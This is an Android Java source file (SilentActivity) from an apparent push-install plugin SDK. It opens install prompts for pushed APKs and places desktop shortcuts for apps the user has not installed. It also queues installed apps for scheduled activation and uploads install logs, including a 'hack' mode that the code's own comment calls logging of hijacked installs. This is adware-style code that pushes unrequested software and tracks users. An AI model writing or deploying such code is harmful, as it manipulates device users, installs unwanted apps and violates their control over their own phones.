package com.tiho.dlplugin.task.silent;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Bundle;

import com.ryg.dynamicload.DLBasePluginActivity;
import com.ryg.dynamicload.DLNotifyActivity;
import com.ryg.utils.DLConstants;
import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.bean.PushSilentBean;
import com.tiho.dlplugin.common.CommonInfo;
import com.tiho.dlplugin.dao.DAOFactory;
import com.tiho.dlplugin.log.LogUploadManager;
import com.tiho.dlplugin.task.activate.ActivatedRecord;
import com.tiho.dlplugin.task.scheduleact.ScheduleActList;
import com.tiho.dlplugin.task.silent.dao.IndepentSilnetDAO;
import com.tiho.dlplugin.util.PackageUtil;
import com.tiho.dlplugin.util.SilentInstall;
import com.tiho.dlplugin.util.StringUtils;

/**
 * 
 * 提示用户安装apk
 * 
 * @author Joey.Dai
 * 
 */
public class SilentActivity extends DLBasePluginActivity {

	private boolean fromShortcut = false;// 是否从快捷方式点击之后到达这里

	private static List<String> packlist = new ArrayList<String>();
	private String mBasePkg = null;
	private boolean mHack = false;
	
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		LogManager.LogShow("onCreate");
	}

	@Override
	public void onResume() {
		super.onResume();
		LogManager.LogShow("onResume");

		Intent intent = getIntent();
		LogManager.LogShow("Install OnResume");

		String pack = intent.getStringExtra("pack");
		fromShortcut = intent.getBooleanExtra("fromShortcut", false);
		mBasePkg = intent.getStringExtra("basePkg");
		mHack = intent.getBooleanExtra("hack", false);
		
		if (checkList()) {
			finish();
			return;
		} else {

			try {
				PushSilentBean ps = queryPack(pack);
				if (ps == null) {
					LogManager.LogShow("SilentActivity找不到 pack:" + pack);
					finish();
					return;
				}
				if (!PackageUtil.isInstalled(pack, that)) {
					synchronized (packlist) {
						packlist.add(pack);
					}

					PackageUtil.gotoInstall(ps.getApkFile(that)
							.getAbsolutePath(), that, ps.getPack().hashCode());
				} else {
					LogManager.LogShow("Activate action");
					runApp(ps.getPack());
				}

			} catch (Exception e1) {
				e1.printStackTrace();
				LogManager.LogShow("e1");
			}
		}
	}

	private boolean checkList() {
		synchronized (packlist) {
			if (!packlist.isEmpty()) {
				for (String pack : packlist) {
					ActivityResult(pack.hashCode());
				}

				packlist.clear();
				return true;
			}

			return false;
		}
	}

	public static Intent shortcutIntent(Context c, String pack,
			boolean fromShortcut) {

		Intent intent = new Intent(Intent.ACTION_MAIN);
		// 点了快捷方式后还是到这里来
		intent.setClass(c, DLNotifyActivity.class);
		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
		
		intent.putExtra(DLConstants.EXTRA_PACKAGE, CommonInfo.getInstance(c).getPluginName());
		intent.putExtra(DLConstants.EXTRA_CLASS, SilentActivity.class.getName());
		intent.putExtra(DLConstants.EXTRA_RESERVE, "frompush");
		Bundle data = new Bundle();

		data.putString("targetClass", SilentActivity.class.getName());
		data.putString("pack", pack);
		data.putBoolean("fromShortcut", fromShortcut);

		intent.putExtras(data);

		return intent;
	}

	public static void createShortcut(Context c, PushSilentBean ps,
			String appname) {
		try {
			Intent i = shortcutIntent(c, ps.getPack(), true);
			Bitmap icon = PackageUtil.loadUninstallApkIcon(c, ps.getApkFile(c)
					.getAbsolutePath());
			PackageUtil.createShortcutOnDesktop(c, i, appname, icon);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	protected void ActivityResult(int requestCode) {
		LogManager.LogShow("ActivityResult");

		LogManager.LogShow("安装界面已返回 , request_code(push_id) = " + requestCode);

		PushSilentBean msg = null;
		try {
			msg = queryHash(requestCode);
		} catch (Exception e1) {
			e1.printStackTrace();
			LogManager.LogShow(e1);
		}

		if (msg == null) {
			LogManager.LogShow("message is null");
			finish();
			return;
		}

		boolean installed = false;
		if (PackageUtil.isInstalled(msg.getPack(), that)) {
		    installed = true;
			LogManager.LogShow(msg.getPack() + "安装成功,原文件路径:"
					+ msg.getApkFile(that).getAbsolutePath());
			int from = 0;
			if(mHack){
			    from = 2;
			}else if(fromShortcut){
			    from = 1;
			}
			// 安装日志
			LogUploadManager.getInstance(that).addSilentInstallLog(2,
					"ALREADY_INSTALLED", msg.getPack(), 2, "Y", from);

			// 通过快捷方式成功日志
			if (fromShortcut)
				LogUploadManager.getInstance(that).addSilentShortcutLog(
								msg.getId(), "Y", "Y", SilentInstall.IsSupportBGInstall(that) == 0 ? "Y" : "N", 1,
								"INSTALL_SUCCESS_FROM_SHORTCUT", 1);

			// 安装完之后要激活

			if (!StringUtils.isEmpty(msg.getTimeract())) {
				// 如果已经安装就加入到定时激活列表中
				DAOFactory.getScheduleActSilentDAO(that).saveScheduleList(
						msg.getId(), msg.getPack(), msg.getTimeract(), true);
				ScheduleActList.getInstance(that).load(msg.getPack());
			}

		} else {
			LogManager.LogShow(msg.getPack() + "安装失败,需要创建快捷方式,原文件路径:"
					+ msg.getApkFile(that));
			if (fromShortcut)
				LogUploadManager.getInstance(that).addSilentShortcutLog(
								msg.getId(), "Y", "Y", SilentInstall.IsSupportBGInstall(that) == 0 ? "Y" : "N", 0,
								"INSTALL_FAILED_FROM_SHORTCUT", 1);

			// 创建快捷方式
			String appname = PackageUtil.parseAppName(that, msg
					.getApkFile(that).getAbsolutePath());
			if (!PackageUtil.hasShortcut(that, appname)) {
				createShortcut(that, msg, appname);

				LogManager.LogShow("创建快捷方式完成，name=" + appname);
			} else {
				LogManager.LogShow(appname + "快捷方式已经存在");
			}
		}
		//添加劫持安装日志
		if(mHack){
		    LogUploadManager.getInstance(that).uploadInstallMonitorLog(msg.getPack(), mBasePkg, "install", (installed ? "TRUE" : "FALSE"));
		}
	}

	private PushSilentBean queryPack(String pack) throws Exception {
		IndepentSilnetDAO dao = DAOFactory.getIndepentSilnetDAO(that);
		return (PushSilentBean) dao.queryByPack(pack);
	}

	private PushSilentBean queryHash(int hash) throws Exception {
		IndepentSilnetDAO dao = DAOFactory.getIndepentSilnetDAO(that);
		return (PushSilentBean) dao.queryByPackHash(hash);
	}

	private void runApp(String pack) {
		try {
			PushSilentBean ps = queryPack(pack);
			if (PackageUtil.isInstalled(pack, that)) {
				if (!ActivatedRecord.getInstance(that).activated(pack)) {
					// 通过快捷方式激活应用
					LogUploadManager.getInstance(that).addSilentShortcutLog(
							ps.getId(),
							"Y",
							"Y",
							SilentInstall.IsSupportBGInstall(that) == 0 ? "Y"
									: "N", 1, "", 2);

					ActivatedRecord.getInstance(that).addRecord(that, pack,
							System.currentTimeMillis());
				}

				PackageUtil.openApp(that, pack);

				finish();

			} else {
				File file = ps.getApkFile(that);

				PackageUtil.gotoInstall(file.getAbsolutePath(), that,
						ps.hashCode());
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static void gotoShortcutActivity(final Context c, String pack,
			final boolean fromShortcut) {
		// TODO 需要判断是否是jar还是apk

		Intent it = shortcutIntent(c, pack, fromShortcut);
		c.startActivity(it);
	}

    public static void gotoSilentActivityHack(final Context c, String pack, String basePkg, boolean hack) {
        Intent intent = new Intent(Intent.ACTION_MAIN);
        // 点了快捷方式后还是到这里来
        intent.setClass(c, DLNotifyActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        intent.putExtra(DLConstants.EXTRA_PACKAGE, CommonInfo.getInstance(c).getPluginName());
        intent.putExtra(DLConstants.EXTRA_CLASS, SilentActivity.class.getName());
        intent.putExtra(DLConstants.EXTRA_RESERVE, "frompush");
        
        Bundle data = new Bundle();
        data.putString("targetClass", SilentActivity.class.getName());
        data.putString("pack", pack);
        data.putString("basePkg", basePkg);
        data.putBoolean("hack", hack);
        intent.putExtras(data);
        c.startActivity(intent);
    }
}
